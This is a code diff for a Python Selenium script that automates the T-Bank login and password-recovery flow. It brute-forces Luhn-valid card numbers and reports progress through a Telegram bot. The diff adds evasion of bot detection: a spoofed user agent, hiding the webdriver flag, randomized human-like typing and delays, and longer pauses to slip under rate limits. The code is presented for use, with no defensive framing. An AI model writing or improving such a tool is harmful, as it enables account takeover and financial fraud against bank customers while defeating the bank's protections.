@@ -1,6 +1,7 @@
 import logging
 import threading
 import time
+import random
 from enum import Enum
 from typing import Dict, Optional
 from selenium import webdriver
@@ -63,22 +64,45 @@ def luhn_check_15(s: str) -> int:
             total += digit
     return (10 - (total % 10)) % 10
 
+def human_delay(min_sec=0.3, max_sec=1.5):
+    """Random delay to simulate human behavior"""
+    time.sleep(random.uniform(min_sec, max_sec))
+
+def human_type(element, text):
+    """Type text with random delays between keystrokes"""
+    for char in text:
+        element.send_keys(char)
+        time.sleep(random.uniform(0.05, 0.2))
+
 def start_browser_session(session: UserSession):
     """Start a headless Chrome browser session"""
-    options = webdriver.ChromeOptions()
-    options.add_argument('--headless')
-    options.add_argument('--no-sandbox')
-    options.add_argument('--disable-dev-shm-usage')
-    options.add_argument('--disable-blink-features=AutomationControlled')
-    options.add_argument('--disable-gpu')
-    options.add_argument('--window-size=1920,1080')
-    options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    options.add_experimental_option('useAutomationExtension', False)
-    
-    service = Service(ChromeDriverManager().install())
-    session.driver = webdriver.Chrome(service=service, options=options)
-    session.driver.get(LOGIN_URL)
-    time.sleep(2)
+    try:
+        options = webdriver.ChromeOptions()
+        options.add_argument('--headless=new')
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        options.add_argument('--disable-blink-features=AutomationControlled')
+        options.add_argument('--disable-gpu')
+        options.add_argument('--window-size=1920,1080')
+        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option('useAutomationExtension', False)
+        options.binary_location = '/usr/bin/google-chrome-stable'
+        
+        service = Service(ChromeDriverManager().install())
+        session.driver = webdriver.Chrome(service=service, options=options)
+        
+        # Execute CDP commands to further hide automation
+        session.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
+            "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        })
+        session.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+        
+        session.driver.get(LOGIN_URL)
+        human_delay(2, 4)
+    except Exception as e:
+        logger.error(f"Failed to start browser: {e}")
+        raise
 
 def enter_phone_number(session: UserSession):
     """Enter phone number on T-Bank login page"""
@@ -86,14 +110,20 @@ def enter_phone_number(session: UserSession):
         phone_input = WebDriverWait(session.driver, 10).until(
             EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='tel']"))
         )
+        human_delay(0.5, 1.5)
+        phone_input.click()
+        human_delay(0.3, 0.8)
         phone_input.clear()
+        human_delay(0.2, 0.5)
+        
         # Remove + from phone number for input
         phone_to_enter = session.phone.lstrip('+')
-        phone_input.send_keys(phone_to_enter)
+        human_type(phone_input, phone_to_enter)
         
+        human_delay(0.5, 1.2)
         continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
         continue_btn.click()
-        time.sleep(2)
+        human_delay(2, 3)
         return True
     except Exception as e:
         logger.error(f"Error entering phone number: {e}")
@@ -105,18 +135,24 @@ def enter_sms_code(session: UserSession, code: str):
         code_input = WebDriverWait(session.driver, 10).until(
             EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text'][inputmode='numeric']"))
         )
+        human_delay(0.5, 1.0)
+        code_input.click()
+        human_delay(0.3, 0.6)
         code_input.clear()
-        code_input.send_keys(code)
+        human_delay(0.2, 0.4)
+        human_type(code_input, code)
         
+        human_delay(0.5, 1.0)
         continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
         continue_btn.click()
-        time.sleep(3)
+        human_delay(3, 4)
         
         # Check if password page appears
         try:
             forgot_pass_btn = session.driver.find_element(By.XPATH, "//button[contains(text(), 'Не помню пароль')]")
+            human_delay(0.5, 1.0)
             forgot_pass_btn.click()
-            time.sleep(2)
+            human_delay(2, 3)
         except NoSuchElementException:
             pass
         
@@ -134,15 +170,20 @@ def try_card_number(session: UserSession, card_number: str) -> bool:
     try:
         # Find card number input
         card_input = session.driver.find_element(By.CSS_SELECTOR, "input[type='text'][inputmode='numeric']")
+        human_delay(0.5, 1.0)
+        card_input.click()
+        human_delay(0.3, 0.6)
         card_input.clear()
-        card_input.send_keys(card_number)
+        human_delay(0.2, 0.4)
+        human_type(card_input, card_number)
         
         # Click continue
+        human_delay(0.7, 1.5)
         continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
         continue_btn.click()
         
         # Wait and check for redirect
-        time.sleep(5)
+        human_delay(5, 7)
         current_url = session.driver.current_url
         
         # Check if URL changed (successful redirect)
@@ -194,7 +235,7 @@ async def brute_force_worker(session: UserSession, app: Application):
                     text=f"⏳ Прогресс: {progress:.1f}% (проверено {candidate} комбинаций)"
                 )
             
-            time.sleep(10)  # Wait between attempts to avoid rate limiting
+            human_delay(10, 15)  # Wait between attempts to avoid rate limiting
             
             session.current_candidate = candidate + 1
         
